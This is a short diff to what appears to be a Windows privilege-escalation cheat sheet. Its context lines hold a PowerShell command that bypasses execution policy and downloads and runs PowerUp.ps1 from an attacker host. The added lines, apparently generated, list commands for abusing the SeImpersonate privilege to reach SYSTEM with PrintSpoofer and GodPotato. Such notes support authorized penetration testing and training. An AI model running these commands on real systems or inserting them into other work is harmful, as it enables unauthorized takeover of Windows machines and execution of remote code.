@@ -432,6 +432,13 @@ systeminfo                           # patch level -> known exploit
 # PowerUp for service/registry/path misconfigs:
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<your-ip>/PowerUp.ps1'); Invoke-AllChecks"
 # Also: unquoted service paths, AlwaysInstallElevated, stored creds (cmdkey /list).
+
+# SeImpersonate (app-pool/service acct) -> SYSTEM via a Potato (check whoami /priv first):
+# companion:gen potato-seimpersonate
+whoami /priv
+PrintSpoofer64.exe -i -c cmd
+GodPotato -cmd "cmd /c whoami"
+# companion:end potato-seimpersonate
 ////////////////////////////////////////
 
 
